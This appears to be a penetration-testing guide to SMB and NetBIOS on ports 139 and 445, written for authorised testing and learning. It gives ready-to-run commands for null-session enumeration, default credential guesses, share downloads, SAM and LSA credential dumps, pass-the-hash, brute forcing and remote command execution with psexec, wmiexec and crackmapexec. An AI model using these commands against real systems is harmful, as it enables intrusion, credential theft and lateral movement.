139,445 - Pentesting SMB
Port 139

NetBIOS stands for Network Basic Input Output System. It is a software protocol that allows applications, PCs, and Desktops on a local area network (LAN) to communicate with network hardware and to transmit data across the network. Software applications that run on a NetBIOS network locate and identify each other via their NetBIOS names. A NetBIOS name is up to 16 characters long and usually, separate from the computer name. Two applications start a NetBIOS session when one (the client) sends a command to “call” another client (the server) over TCP Port 139. (extracted from here)

139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn

Port 445

While Port 139 is known technically as ‘NBT over IP’, Port 445 is ‘SMB over IP’. SMB stands for ‘Server Message Blocks’. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.

For instance, on Windows, SMB can run directly over TCP/IP without the need for NetBIOS over TCP/IP. This will use, as you point out, port 445. On other systems, you’ll find services and applications using port 139. This means that SMB is running with NetBIOS over TCP/IP. (extracted from here)

445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)

IPC$ share

From book Network Security Assessment 3rd edition

With an anonymous null session you can access the IPC$ share and interact with services exposed via named pipes. The enum4linux utility within Kali Linux is particularly useful; with it, you can obtain the following:

    Operating system information

    Details of the parent domain

    A list of local users and groups

    Details of available SMB shares

    The effective system security policy

What is NTLM

If you don't know what is NTLM or you want to know how it works and how to abuse it, you will find very insteresting this page about NTLM where is explained how this protocol works and how you can take advantage of it.
Enumeration
Scan a network searching for hosts:

nbtscan -r 192.168.0.1/24

SMB server version

To look for possible exploits to the SMB version it important to know which version is being used. If this information does not appear in other used tools, you can:

    Use the MSF auxiliary module _auxiliary/scanner/smb/smb_version  

    **_Or this script**:

#!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
echo "" && sleep .1

Search exploit

msf> search type:exploit platform:windows target:2008 smb
searchsploit microsoft smb

Possible Credentials

Username(s)
	

Common passwords

(blank)
	

(blank)

guest
	

(blank)

Administrator, admin
	

(blank), password, administrator, admin

arcserve
	

arcserve, backup

tivoli, tmersrvd
	

tivoli, tmersrvd, admin

backupexec, backup
	

backupexec, backup, arcada

test, lab, demo
	

password, test, lab, demo
Obtain information

#Dump interesting information
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
nmap --script "safe or smb-enum-*" -p 445 <IP>
​
#Connect to the rpc
rpcclient -U "" -N <IP> #No creds
rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
#You can use querydispinfo and enumdomusers to query user information
​
#Dump user information
/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
​
#Map possible RPC endpoints
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>

Enumerating LSARPC and SAMR rpcclient

Pat of this section was extracted from book "Network Security Assesment 3rd Edition"

You can use the Samba rpcclient utility to interact with RPC endpoints via named pipes. The following lists commands that you can issue to SAMR, LSARPC, and LSARPC-DS interfaces upon establishing a SMB session (often requiring credentials).
Users enumeration

    List users: querydispinfo and enumdomusers

    Get user details: queryuser <0xrid>

    Get user groups: queryusergroups <0xrid>

    GET SID of a user: lookupnames <username>

    Get users aliases: queryuseraliases [builtin|domain] <sid>

Groups enumeration

    List groups: enumdomgroups

    Get group details: querygroup <0xrid>

    Get group members: querygroupmem <0xrid>

Aliasgroups enumeration

    List alias: enumalsgroups <builtin|domain>

    Get members: queryaliasmem builtin|domain <0xrid>

Domains enumeration

    List domains: enumdomains

    Get SID: lsaquery

    Domain info: querydominfo

More SIDs

    Find SIDs by name: lookupnames <username>

    Find more SIDs: lsaenumsid

    RID cycling (check more SIDs): lookupsids <sid>

Command
	

Interface
	

Description

queryuser
	

SAMR
	

Retrieve user information

querygroup
	

Retrieve group information
	

​

querydominfo
	

Retrieve domain information
	

​

enumdomusers
	

Enumerate domain users
	

​

enumdomgroups
	

Enumerate domain groups
	

​

createdomuser
	

Create a domain user
	

​

deletedomuser
	

Delete a domain user
	

​

lookupnames
	

LSARPC
	

Look up usernames to SIDa values

lookupsids
	

Look up SIDs to usernames (RIDb cycling)
	

​

lsaaddacctrights
	

Add rights to a user account
	

​

lsaremoveacctrights
	

Remove rights from a user account
	

​

dsroledominfo
	

LSARPC-DS
	

Get primary domain information

dsenumdomtrusts
	

Enumerate trusted domains within an AD forest
	

​

To understand better how the tools samrdump and rpcdump works you should read Pentesting MSRPC.
List shared folders

It is always recommended to look if you can access to anything, if you don't have credentials try using null credentials/guest user.

smbclient --no-pass -L //<IP> # Null user
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
smbmap -H <IP> [-P <PORT>] #Null user
smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds
smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash
crackmapexec smb <IP> -u '' -p '' --shares #Null user
crackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user
crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user

Connect/List a shared folder

#Connect using smbclient
smbclient --no-pass //<IP>/<Folder>
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient
​
#List with smbmap, without folder it list everything
smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list
smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list
smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash

Manually enumerate windows shares and connect to them

It may be possible that you are restricted to display any shares of the host machine and when you try to list them it appears as if there aren't any shares to connect to. Thus it might be worth a short to try to manually connect to a share. To enumerate the shares manually you might want to look for responses like NT_STATUS_ACCESS_DENIED and NT_STATUS_BAD_NETWORK_NAME, when using a valid session (e.g. null session or valid credentials). These may indicate whether the share exists and you do not have access to it or the share does not exist at all.

Common share names for windows targets are

    C$

    D$

    ADMIN$

    IPC$

    PRINT$

    FAX$

    SYSVOL

    NETLOGON

(Common share names from Network Security Assessment 3rd edition)

You can try to connect to them by using the following command

smbclient -U '%' -N \\\\<IP>\\<SHARE> # null session to connect to a windows share
smbclient -U '<USER>' \\\\<IP>\\<SHARE> # authenticated session to connect to a windows share (you will be prompted for a password)

or this script (using a null session)

#/bin/bash
​
ip='<TARGET-IP-HERE>'
shares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')
​
for share in ${shares[*]}; do
    output=$(smbclient -U '%' -N \\\\$ip\\$share -c '') 
​
    if [[ -z $output ]]; then 
        echo "[+] creating a null session is possible for $share" # no output if command goes through, thus assuming that a session was created
    else
        echo $output # echo error message (e.g. NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)
    fi
done

examples

smbclient -U '%' -N \\\\192.168.0.24\\im_clearly_not_here # returns NT_STATUS_BAD_NETWORK_NAME
smbclient -U '%' -N \\\\192.168.0.24\\ADMIN$ # returns NT_STATUS_ACCESS_DENIED or even gives you a session

Mount a shared folder

mount -t cifs //x.x.x.x/share /mnt/share
mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share

Download files

Read previous sections to learn how to connect with credentials/Pass-the-Hash.

#Search a file and download
sudo smbmap -R Folder -H <IP> -A <FileName> -q # Search the file in recursive mode and download it inside /usr/share/smbmap

#Download all
smbclient //<IP>/<share>
> mask ""
> recurse
> prompt
> mget *
#Download everything to current directory

Commands:

    mask: specifies the mask which is used to filter the files within the directory (e.g. "" for all files)

    recurse: toggles recursion on (default: off)

    prompt: toggles prompting for filenames off (default: on)

    mget: copies all files matching the mask from host to client machine

(Information from the manpage of smbclient)
Read Registry

You may be able to read the registry using some discovered credentials. Impacket reg.py allows you to try:

sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s

Authenticate using Kerberos

You can authenticate to kerberos using the tools smbclient and rpcclient:

smbclient --kerberos //ws01win10.domain.com/C$
rpcclient -k ws01win10.domain.com

Execute
crackmapexec

crackmapexec can execute commands abusing any of mmcexec, smbexec, atexec, wmiexec being wmiexec the default method. You can indicate which option you prefer to use with the parameter --exec-method:

apt-get install crackmapexec
​
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
crackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash
# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}
​
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #Get sessions (
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #Get logged-on users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #Enumerate the disks
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #Enumerate users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups # Enumerate groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups # Enumerate local groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #Get password policy
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RID brute

​psexec/smbexec​

Both options will create a new service (using \pipe\svcctl via SMB) in the victim machine and use it to execute something (psexec will upload an executable file to ADMIN$ share and smbexec will point to cmd.exe/powershell.exe and put in the arguments the payload --file-less technique--).
More info about psexec and smbexec.
In kali it is located on /usr/share/doc/python3-impacket/examples/

#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash

Using parameter-k you can authenticate against kerberos instead of NTLM
​wmiexec/dcomexec

Stealthily execute a command shell without touching the disk or running a new service using DCOM via port 135.
In kali it is located on /usr/share/doc/python3-impacket/examples/

#If no password is provided, it will be prompted
./wmiexec.py [[domain/]username[:password]@]<targetName or address> #Prompt for password
./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted

Using parameter-k you can authenticate against kerberos instead of NTLM

#If no password is provided, it will be prompted
./dcomexec.py [[domain/]username[:password]@]<targetName or address>
./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted

​AtExec​

Execute commands via the Task Scheduler (using \pipe\atsvc via SMB).
In kali it is located on /usr/share/doc/python3-impacket/examples/

./atexec.py [[domain/]username[:password]@]<targetName or address> "command"
./atexec.py -hashes <LM:NT> administrator@10.10.10.175 "whoami"

Impacket reference

​https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/​
Bruteforce users credentials

This is not recommended, you could block an account if you exceed the maximum allowed tries

nmap --script smb-brute -p 445 <IP>
ridenum.py <IP> 500 50000 /root/passwds.txt #Get usernames bruteforcing that rids and then try to bruteforce eachusername

SMB relay attack

This attack uses the Responder toolkit to capture SMB authentication sessions on an internal network, and relays them to a target machine. If the authentication session is successful, it will automatically drop you into a system shell.
More information about this attack here.​
SMB-Trap

The Windows library URLMon.dll automatically try to authenticaticate to the host when a page tries to access some contect via SMB, for example: img src="\\10.10.10.10\path\image.jpg"

This happens with the funcions:

    URLDownloadToFile

    URLDownloadToCache

    URLOpenStream

    URLOpenBlockingStream

Which are used by some browsers and tools (like Skype)
From: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html
SMBTrap using MitMf
From: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html
